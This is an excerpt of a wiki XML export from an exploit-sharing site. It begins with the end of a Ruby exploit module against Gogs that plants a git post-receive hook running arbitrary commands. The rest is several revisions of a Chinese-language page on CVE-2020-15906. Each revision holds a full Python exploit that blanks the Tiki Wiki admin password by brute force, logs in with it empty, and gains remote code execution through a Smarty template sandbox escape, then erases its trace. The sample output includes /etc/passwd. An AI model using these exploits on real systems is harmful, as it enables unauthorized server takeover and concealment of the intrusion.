  end
 
  def get_csrf(uri)
    vprint_status('Get "csrf" value')
    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(uri)
    )
    unless res
      fail_with(Failure::Unreachable, 'Unable to get the CSRF token')
    end
 
    csrf = extract_value(res, '_csrf')
    vprint_good("csrf=#{csrf}")
    csrf
  end
 
  def extract_value(res, attr)
    # &lt;input type="hidden" name="_csrf" value="Ix7E3_U_lOt-kZfeMjEll57hZuU6MTYxNzAyMzQwOTEzMjU1MDUwMA"&gt;
    # &lt;input type="hidden" id="user_id" name="user_id" value="1" required&gt;
    # &lt;input type="hidden" name="last_commit" value="6a7eb84e9a8e4e76a93ea3aec67b2f70fe2518d2"&gt;
    unless (match = res.body.match(/&lt;input .*name="#{attr}" +value="(?&lt;value&gt;[^"]+)".*&gt;/))
      return fail_with(Failure::NotFound, "\"#{attr}\" not found in response")
    end
 
    return match[:value]
  end
 
  def gogs_login
    res = http_post_request(
      '/user/login',
      user_name: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )
    unless res
      fail_with(Failure::Unreachable, 'Unable to reach the login page')
    end
 
    unless res.code == 302
      fail_with(Failure::NoAccess, 'Login failed')
    end
 
    nil
  end
 
  def gogs_create_repo
    uri = normalize_uri(datastore['TARGETURI'], '/repo/create')
 
    res = send_request_cgi('method' =&gt; 'GET', 'uri' =&gt; uri)
    unless res
      fail_with(Failure::Unreachable, "Unable to reach #{uri}")
    end
 
    vprint_status('Get "csrf" and "user_id" values')
    csrf = extract_value(res, '_csrf')
    vprint_good("csrf=#{csrf}")
    user_id = extract_value(res, 'user_id')
    vprint_good("user_id=#{user_id}")
 
    res = http_post_request(
      uri,
      user_id: user_id,
      repo_name: @repo_name,
      private: 'on',
      description: '',
      gitignores: '',
      license: '',
      readme: 'Default',
      auto_init: 'on',
      csrf: csrf
    )
    unless res
      fail_with(Failure::Unreachable, "Unable to reach #{uri}")
    end
 
    unless res.code == 302
      fail_with(Failure::UnexpectedReply, 'Create repository failure')
    end
 
    nil
  end
 
  def gogs_post_receive_hook(cmd)
    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings/hooks/git/post-receive')
    shell = &lt;&lt;~SHELL
      #!/bin/bash
      #{cmd}&amp;
      exit 0
    SHELL
 
    res = http_post_request(uri, content: shell)
    unless res
      fail_with(Failure::Unreachable, "Unable to reach #{uri}")
    end
 
    unless res.code == 302
      msg = 'Post-receive hook creation failure'
      if res.code == 404
        msg &lt;&lt; ' (user is probably not allowed to create Git Hooks)'
      end
      fail_with(Failure::UnexpectedReply, msg)
    end
 
    nil
  end
 
  def gogs_create_file(last_chunk: false)
    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/_new/master')
    filename = "#{Rex::Text.rand_text_alpha(4..8)}.txt"
 
    res = send_request_cgi('method' =&gt; 'GET', 'uri' =&gt; uri)
    unless res
      fail_with(Failure::Unreachable, "Unable to reach #{uri}")
    end
 
    vprint_status('Get "csrf" and "last_commit" values')
    csrf = extract_value(res, '_csrf')
    vprint_good("csrf=#{csrf}")
    last_commit = extract_value(res, 'last_commit')
    vprint_good("last_commit=#{last_commit}")
 
    http_post_request(
      uri,
      last_commit: last_commit,
      tree_path: filename,
      content: Rex::Text.rand_text_alpha(1..20),
      commit_summary: '',
      commit_message: '',
      commit_choice: 'direct',
      csrf: csrf,
      timeout: last_chunk ? 0 : 20 # The last one never returns, don't bother waiting
    )
    vprint_status("#{filename} created")
 
    nil
  end
 
  # Hook the HTTP client method to add specific cookie management logic
  def send_request_cgi(opts, timeout = 20)
    res = super
 
    return unless res
 
    # HTTP client does not handle cookies with the same name correctly. It adds
    # them instead of substituing the old value with the new one.
    unless res.get_cookies.empty?
      cookie_jar_hash = cookie_jar_to_hash
      cookies_from_response = cookie_jar_to_hash(res.get_cookies.split(' '))
      cookie_jar_hash.merge!(cookies_from_response)
      cookie_jar_updated = cookie_jar_hash.each_with_object(Set.new) do |cookie, set|
        set &lt;&lt; "#{cookie[0]}=#{cookie[1]}"
      end
      cookie_jar.clear
      cookie_jar.merge(cookie_jar_updated)
    end
 
    res
  end
 
  def cookie_jar_to_hash(jar = cookie_jar)
    jar.each_with_object({}) do |cookie, cookie_hash|
      name, value = cookie.split('=')
      cookie_hash[name] = value
    end
  end
 
  def cleanup
    super
    return unless @need_cleanup
 
    print_status('Cleaning up')
    uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings')
    res = http_post_request(uri, action: 'delete', repo_name: @repo_name)
 
    unless res
      fail_with(Failure::Unreachable, 'Unable to reach the settings page')
    end
 
    unless res.code == 302
      fail_with(Failure::UnexpectedReply, 'Delete repository failure')
    end
 
    print_status("Repository #{@repo_name} deleted.")
 
    nil
  end
end
&lt;/pre&gt;</text>
      <sha1>dx4poahbeksgx0n9r3r5gms4wgx9vw7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15906 Tiki Wiki CMS Groupware 認證繞過漏洞</title>
    <ns>0</ns>
    <id>5157</id>
    <revision>
      <id>5903</id>
      <timestamp>2021-06-25T06:47:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞描述== &lt;/translate&gt; &lt;translate&gt; Tiki Wiki CMS Groupware或簡稱為Tiki（最初稱為TikiWiki）是一種免費且開源的基於Wiki的..."</comment>
      <origin>5903</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6220" sha1="svcr3p0w0uoxnlhnc21nf6e3onmwj6b" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞描述==
&lt;/translate&gt;
&lt;translate&gt;
Tiki Wiki CMS Groupware或簡稱為Tiki（最初稱為TikiWiki）是一種免費且開源的基於Wiki的內容管理系統和在線辦公套件。在如下這些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一處邏輯錯誤，管理員賬戶被爆破60次以上時將被鎖定，此時使用空白密碼即可以管理員身份登錄後台。
&lt;/translate&gt;

&lt;translate&gt;
==影響範圍==
&lt;/translate&gt;
16.x - 21.1

==POC==
&lt;pre&gt;
python poc.py &lt;target&gt; / id
&lt;/pre&gt;

&lt;pre&gt;
#!/usr/bin/env python3
"""
Tiki Wiki CMS GroupWare Serverside Template Injection Remote Code Execution Vulnerability
This is a demonstration of CVE-2021-26119 (Smarty Template Engine template_object Sandbox Escape PHP Code Injection)
Written by: Steven Seeley of Qihoo 360 Vulcan Team
Exploit tested against: Tiki Wiki 20.3 (Tarazed)
Bug 1: CVE-2020-15906
    - An unauthenticated user can bypass the authentication by bruteforcing the admin account &gt; 50 times and login with a blank password
    - Works on: &lt;= 21.1 (UY_Scuti)
    
Bug 2: CVE-2021-26119 
    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the 'template_object' property
    - Works on: &lt;= 22.2 (Corona_Borealis) and impacts Smarty &lt;= 3.1.38 (latest)
# Notes
- *WARNING* This exploit will lock out the administrator account
- It was possible in older versions of Tiki Wiki (including 20.3) that you could:
  1. Edit Smarty templates with a user that had the 'tiki_p_edit_templates' privilege, but Tiki clued into this and has since disabled this 'feature' by default, see using [Risky preferences](https://doc.tiki.org/Risky-Preferences)
  2. Disable the Smarty sandbox entirely by unchecking the "Smarty Security" checkbox in the general security tab which is no longer possible.
  However it's still possible for an admin (or user with the 'tiki_p_admin' permission assigned) to add Smarty template syntax to the 'feature_custom_html_head_content' option under [Customization](http://doc.tiki.org/Customization) in the [Look and Feel](http://doc.tiki.org/Look-and-Feel) control panel menu. This is enough for attackers to escape the Smarty sandbox leveraging either CVE-2021-26119 or CVE-2021-26120 and execute arbitrary remote code.
# Example
researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py &lt;host&gt; &lt;path&gt; &lt;cmd&gt;
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id
researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ "id;uname -a;pwd;head /etc/passwd"
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# References
- Maximilian Barz's poc at https://github.com/S1lkys/CVE-2020-15906
"""
 
import requests
import sys
import re
 
def auth_bypass(s, t):
    d = {
        "ticket" : "",
        "user" : "admin",
        "pass" : "trololololol",
    }
    h = { "referer" : t }
    d["ticket"] = get_ticket(s, "%stiki-login.php" % t)
    d["pass"] = "" # blank login
    r = s.post("%stiki-login.php" % t, data=d, headers=h)
    r = s.get("%stiki-admin.php" % t)
    assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"
 
def black_password(s, t):
    uri = "%stiki-login.php" % t
    # setup cookies here
    s.get(uri)
    ticket = get_ticket(s, uri)
    d = {
        'user':'admin', 
        'pass':'trololololol',
    }
    # crafted especially so unsuccessful_logins isn't recorded
    for i in range(0, 51):
        r = s.post(uri, d)
        if("Account requires administrator approval." in r.text):
            print("(+) admin password blanked!")
            return
    raise Exception("(-) auth bypass failed!") 
 
def get_ticket(s, uri):
    h = { "referer" : uri }
    r = s.get(uri)
    match = re.search('class="ticket" name="ticket" value="(.*)" \/&gt;', r.text)
    assert match, "(-) csrf ticket leak failed!"
    return match.group(1)
 
def trigger_or_patch_ssti(s, t, c=None):
    # CVE-2021-26119
    p = { "page": "look" }
    h = { "referer" : t }
    bypass = "startrce{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:{shell_exec(\"%s\")}')}endrce" % c
    d = {
        "ticket" : get_ticket(s, "%stiki-admin.php" % t),
        "feature_custom_html_head_content" : bypass if c else '',
        "lm_preference[]": "feature_custom_html_head_content"
    }
    r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
    r = s.get("%stiki-index.php" % t)
    if c != None:
        assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("startrce")[1].split("endrce")[0]
        print(cmdr.strip())
 
def main():
    if(len(sys.argv) &lt; 4):
        print("(+) usage: %s &lt;host&gt; &lt;path&gt; &lt;cmd&gt;" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id"% sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /tiki-20.3/ id" % sys.argv[0])
        return
    p = sys.argv[2]
    c = sys.argv[3]
    p = p + "/" if not p.endswith("/") else p
    p = "/" + p if not p.startswith("/") else p
    t = "http://%s%s" % (sys.argv[1], p)
    s = requests.Session()
    print("(+) blanking password...")
    black_password(s, t)
    print("(+) getting a session...")
    auth_bypass(s, t)
    print("(+) auth bypass successful!")
    print("(+) triggering rce...\n")
    # trigger for rce
    trigger_or_patch_ssti(s, t, c)
    # patch so we stay hidden
    trigger_or_patch_ssti(s, t)
 
if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>svcr3p0w0uoxnlhnc21nf6e3onmwj6b</sha1>
    </revision>
    <revision>
      <id>5904</id>
      <parentid>5903</parentid>
      <timestamp>2021-06-25T06:48:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5904</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6253" sha1="1nevf4umjeuk56g2bdbhah7o1gegyi6" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞描述== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
Tiki Wiki CMS Groupware或簡稱為Tiki（最初稱為TikiWiki）是一種免費且開源的基於Wiki的內容管理系統和在線辦公套件。在如下這些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一處邏輯錯誤，管理員賬戶被爆破60次以上時將被鎖定，此時使用空白密碼即可以管理員身份登錄後台。
&lt;/translate&gt;

&lt;translate&gt;
==影響範圍== &lt;!--T:3--&gt;
&lt;/translate&gt;
16.x - 21.1

==POC==
&lt;pre&gt;
python poc.py &lt;target&gt; / id
&lt;/pre&gt;

&lt;pre&gt;
#!/usr/bin/env python3
"""
Tiki Wiki CMS GroupWare Serverside Template Injection Remote Code Execution Vulnerability
This is a demonstration of CVE-2021-26119 (Smarty Template Engine template_object Sandbox Escape PHP Code Injection)
Written by: Steven Seeley of Qihoo 360 Vulcan Team
Exploit tested against: Tiki Wiki 20.3 (Tarazed)
Bug 1: CVE-2020-15906
    - An unauthenticated user can bypass the authentication by bruteforcing the admin account &gt; 50 times and login with a blank password
    - Works on: &lt;= 21.1 (UY_Scuti)
    
Bug 2: CVE-2021-26119 
    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the 'template_object' property
    - Works on: &lt;= 22.2 (Corona_Borealis) and impacts Smarty &lt;= 3.1.38 (latest)
# Notes
- *WARNING* This exploit will lock out the administrator account
- It was possible in older versions of Tiki Wiki (including 20.3) that you could:
  1. Edit Smarty templates with a user that had the 'tiki_p_edit_templates' privilege, but Tiki clued into this and has since disabled this 'feature' by default, see using [Risky preferences](https://doc.tiki.org/Risky-Preferences)
  2. Disable the Smarty sandbox entirely by unchecking the "Smarty Security" checkbox in the general security tab which is no longer possible.
  However it's still possible for an admin (or user with the 'tiki_p_admin' permission assigned) to add Smarty template syntax to the 'feature_custom_html_head_content' option under [Customization](http://doc.tiki.org/Customization) in the [Look and Feel](http://doc.tiki.org/Look-and-Feel) control panel menu. This is enough for attackers to escape the Smarty sandbox leveraging either CVE-2021-26119 or CVE-2021-26120 and execute arbitrary remote code.
# Example
researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py &lt;host&gt; &lt;path&gt; &lt;cmd&gt;
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id
researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ "id;uname -a;pwd;head /etc/passwd"
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# References
- Maximilian Barz's poc at https://github.com/S1lkys/CVE-2020-15906
"""
 
import requests
import sys
import re
 
def auth_bypass(s, t):
    d = {
        "ticket" : "",
        "user" : "admin",
        "pass" : "trololololol",
    }
    h = { "referer" : t }
    d["ticket"] = get_ticket(s, "%stiki-login.php" % t)
    d["pass"] = "" # blank login
    r = s.post("%stiki-login.php" % t, data=d, headers=h)
    r = s.get("%stiki-admin.php" % t)
    assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"
 
def black_password(s, t):
    uri = "%stiki-login.php" % t
    # setup cookies here
    s.get(uri)
    ticket = get_ticket(s, uri)
    d = {
        'user':'admin', 
        'pass':'trololololol',
    }
    # crafted especially so unsuccessful_logins isn't recorded
    for i in range(0, 51):
        r = s.post(uri, d)
        if("Account requires administrator approval." in r.text):
            print("(+) admin password blanked!")
            return
    raise Exception("(-) auth bypass failed!") 
 
def get_ticket(s, uri):
    h = { "referer" : uri }
    r = s.get(uri)
    match = re.search('class="ticket" name="ticket" value="(.*)" \/&gt;', r.text)
    assert match, "(-) csrf ticket leak failed!"
    return match.group(1)
 
def trigger_or_patch_ssti(s, t, c=None):
    # CVE-2021-26119
    p = { "page": "look" }
    h = { "referer" : t }
    bypass = "startrce{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:{shell_exec(\"%s\")}')}endrce" % c
    d = {
        "ticket" : get_ticket(s, "%stiki-admin.php" % t),
        "feature_custom_html_head_content" : bypass if c else '',
        "lm_preference[]": "feature_custom_html_head_content"
    }
    r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
    r = s.get("%stiki-index.php" % t)
    if c != None:
        assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("startrce")[1].split("endrce")[0]
        print(cmdr.strip())
 
def main():
    if(len(sys.argv) &lt; 4):
        print("(+) usage: %s &lt;host&gt; &lt;path&gt; &lt;cmd&gt;" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id"% sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /tiki-20.3/ id" % sys.argv[0])
        return
    p = sys.argv[2]
    c = sys.argv[3]
    p = p + "/" if not p.endswith("/") else p
    p = "/" + p if not p.startswith("/") else p
    t = "http://%s%s" % (sys.argv[1], p)
    s = requests.Session()
    print("(+) blanking password...")
    black_password(s, t)
    print("(+) getting a session...")
    auth_bypass(s, t)
    print("(+) auth bypass successful!")
    print("(+) triggering rce...\n")
    # trigger for rce
    trigger_or_patch_ssti(s, t, c)
    # patch so we stay hidden
    trigger_or_patch_ssti(s, t)
 
if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>1nevf4umjeuk56g2bdbhah7o1gegyi6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15906 Tiki Wiki CMS Groupware 認證繞過漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5164</id>
    <revision>
      <id>5911</id>
      <timestamp>2021-06-25T06:48:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Tiki Wiki CMS Groupware或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。在如下这些版本21.2, 2..."</comment>
      <origin>5911</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6206" sha1="40mwstq7mqzpv3256pz0tidd4w9wndi" xml:space="preserve">&lt;languages /&gt;
==漏洞描述==
Tiki Wiki CMS Groupware或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響範圍==
&lt;/div&gt;
16.x - 21.1

==POC==
&lt;pre&gt;
python poc.py &lt;target&gt; / id
&lt;/pre&gt;

&lt;pre&gt;
#!/usr/bin/env python3
"""
Tiki Wiki CMS GroupWare Serverside Template Injection Remote Code Execution Vulnerability
This is a demonstration of CVE-2021-26119 (Smarty Template Engine template_object Sandbox Escape PHP Code Injection)
Written by: Steven Seeley of Qihoo 360 Vulcan Team
Exploit tested against: Tiki Wiki 20.3 (Tarazed)
Bug 1: CVE-2020-15906
    - An unauthenticated user can bypass the authentication by bruteforcing the admin account &gt; 50 times and login with a blank password
    - Works on: &lt;= 21.1 (UY_Scuti)
    
Bug 2: CVE-2021-26119 
    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the 'template_object' property
    - Works on: &lt;= 22.2 (Corona_Borealis) and impacts Smarty &lt;= 3.1.38 (latest)
# Notes
- *WARNING* This exploit will lock out the administrator account
- It was possible in older versions of Tiki Wiki (including 20.3) that you could:
  1. Edit Smarty templates with a user that had the 'tiki_p_edit_templates' privilege, but Tiki clued into this and has since disabled this 'feature' by default, see using [Risky preferences](https://doc.tiki.org/Risky-Preferences)
  2. Disable the Smarty sandbox entirely by unchecking the "Smarty Security" checkbox in the general security tab which is no longer possible.
  However it's still possible for an admin (or user with the 'tiki_p_admin' permission assigned) to add Smarty template syntax to the 'feature_custom_html_head_content' option under [Customization](http://doc.tiki.org/Customization) in the [Look and Feel](http://doc.tiki.org/Look-and-Feel) control panel menu. This is enough for attackers to escape the Smarty sandbox leveraging either CVE-2021-26119 or CVE-2021-26120 and execute arbitrary remote code.
# Example
researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py &lt;host&gt; &lt;path&gt; &lt;cmd&gt;
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id
researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ "id;uname -a;pwd;head /etc/passwd"
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# References
- Maximilian Barz's poc at https://github.com/S1lkys/CVE-2020-15906
"""
 
import requests
import sys
import re
 
def auth_bypass(s, t):
    d = {
        "ticket" : "",
        "user" : "admin",
        "pass" : "trololololol",
    }
    h = { "referer" : t }
    d["ticket"] = get_ticket(s, "%stiki-login.php" % t)
    d["pass"] = "" # blank login
    r = s.post("%stiki-login.php" % t, data=d, headers=h)
    r = s.get("%stiki-admin.php" % t)
    assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"
 
def black_password(s, t):
    uri = "%stiki-login.php" % t
    # setup cookies here
    s.get(uri)
    ticket = get_ticket(s, uri)
    d = {
        'user':'admin', 
        'pass':'trololololol',
    }
    # crafted especially so unsuccessful_logins isn't recorded
    for i in range(0, 51):
        r = s.post(uri, d)
        if("Account requires administrator approval." in r.text):
            print("(+) admin password blanked!")
            return
    raise Exception("(-) auth bypass failed!") 
 
def get_ticket(s, uri):
    h = { "referer" : uri }
    r = s.get(uri)
    match = re.search('class="ticket" name="ticket" value="(.*)" \/&gt;', r.text)
    assert match, "(-) csrf ticket leak failed!"
    return match.group(1)
 
def trigger_or_patch_ssti(s, t, c=None):
    # CVE-2021-26119
    p = { "page": "look" }
    h = { "referer" : t }
    bypass = "startrce{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:{shell_exec(\"%s\")}')}endrce" % c
    d = {
        "ticket" : get_ticket(s, "%stiki-admin.php" % t),
        "feature_custom_html_head_content" : bypass if c else '',
        "lm_preference[]": "feature_custom_html_head_content"
    }
    r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
    r = s.get("%stiki-index.php" % t)
    if c != None:
        assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("startrce")[1].split("endrce")[0]
        print(cmdr.strip())
 
def main():
    if(len(sys.argv) &lt; 4):
        print("(+) usage: %s &lt;host&gt; &lt;path&gt; &lt;cmd&gt;" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id"% sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /tiki-20.3/ id" % sys.argv[0])
        return
    p = sys.argv[2]
    c = sys.argv[3]
    p = p + "/" if not p.endswith("/") else p
    p = "/" + p if not p.startswith("/") else p
    t = "http://%s%s" % (sys.argv[1], p)
    s = requests.Session()
    print("(+) blanking password...")
    black_password(s, t)
    print("(+) getting a session...")
    auth_bypass(s, t)
    print("(+) auth bypass successful!")
    print("(+) triggering rce...\n")
    # trigger for rce
    trigger_or_patch_ssti(s, t, c)
    # patch so we stay hidden
    trigger_or_patch_ssti(s, t)
 
if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>40mwstq7mqzpv3256pz0tidd4w9wndi</sha1>
    </revision>
    <revision>
      <id>5914</id>
      <parentid>5911</parentid>
      <timestamp>2021-06-25T06:49:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞描述=="</comment>
      <origin>5914</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6145" sha1="lfobhara21agpli7m3im7e42vr30s8k" xml:space="preserve">&lt;languages /&gt;
==漏洞描述==
Tiki Wiki CMS Groupware或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。

==影响范围==
16.x - 21.1

==POC==
&lt;pre&gt;
python poc.py &lt;target&gt; / id
&lt;/pre&gt;

&lt;pre&gt;
#!/usr/bin/env python3
"""
Tiki Wiki CMS GroupWare Serverside Template Injection Remote Code Execution Vulnerability
This is a demonstration of CVE-2021-26119 (Smarty Template Engine template_object Sandbox Escape PHP Code Injection)
Written by: Steven Seeley of Qihoo 360 Vulcan Team
Exploit tested against: Tiki Wiki 20.3 (Tarazed)
Bug 1: CVE-2020-15906
    - An unauthenticated user can bypass the authentication by bruteforcing the admin account &gt; 50 times and login with a blank password
    - Works on: &lt;= 21.1 (UY_Scuti)
    
Bug 2: CVE-2021-26119 
    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the 'template_object' property
    - Works on: &lt;= 22.2 (Corona_Borealis) and impacts Smarty &lt;= 3.1.38 (latest)
# Notes
- *WARNING* This exploit will lock out the administrator account
- It was possible in older versions of Tiki Wiki (including 20.3) that you could:
  1. Edit Smarty templates with a user that had the 'tiki_p_edit_templates' privilege, but Tiki clued into this and has since disabled this 'feature' by default, see using [Risky preferences](https://doc.tiki.org/Risky-Preferences)
  2. Disable the Smarty sandbox entirely by unchecking the "Smarty Security" checkbox in the general security tab which is no longer possible.
  However it's still possible for an admin (or user with the 'tiki_p_admin' permission assigned) to add Smarty template syntax to the 'feature_custom_html_head_content' option under [Customization](http://doc.tiki.org/Customization) in the [Look and Feel](http://doc.tiki.org/Look-and-Feel) control panel menu. This is enough for attackers to escape the Smarty sandbox leveraging either CVE-2021-26119 or CVE-2021-26120 and execute arbitrary remote code.
# Example
researcher@incite:~/tiki$ ./poc.py
(+) usage: ./poc.py &lt;host&gt; &lt;path&gt; &lt;cmd&gt;
(+) eg: ./poc.py 192.168.75.141 / id
(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id
researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ "id;uname -a;pwd;head /etc/passwd"
(+) blanking password...
(+) admin password blanked!
(+) getting a session...
(+) auth bypass successful!
(+) triggering rce...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
/var/www/html/tiki-20.3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
# References
- Maximilian Barz's poc at https://github.com/S1lkys/CVE-2020-15906
"""
 
import requests
import sys
import re
 
def auth_bypass(s, t):
    d = {
        "ticket" : "",
        "user" : "admin",
        "pass" : "trololololol",
    }
    h = { "referer" : t }
    d["ticket"] = get_ticket(s, "%stiki-login.php" % t)
    d["pass"] = "" # blank login
    r = s.post("%stiki-login.php" % t, data=d, headers=h)
    r = s.get("%stiki-admin.php" % t)
    assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"
 
def black_password(s, t):
    uri = "%stiki-login.php" % t
    # setup cookies here
    s.get(uri)
    ticket = get_ticket(s, uri)
    d = {
        'user':'admin', 
        'pass':'trololololol',
    }
    # crafted especially so unsuccessful_logins isn't recorded
    for i in range(0, 51):
        r = s.post(uri, d)
        if("Account requires administrator approval." in r.text):
            print("(+) admin password blanked!")
            return
    raise Exception("(-) auth bypass failed!") 
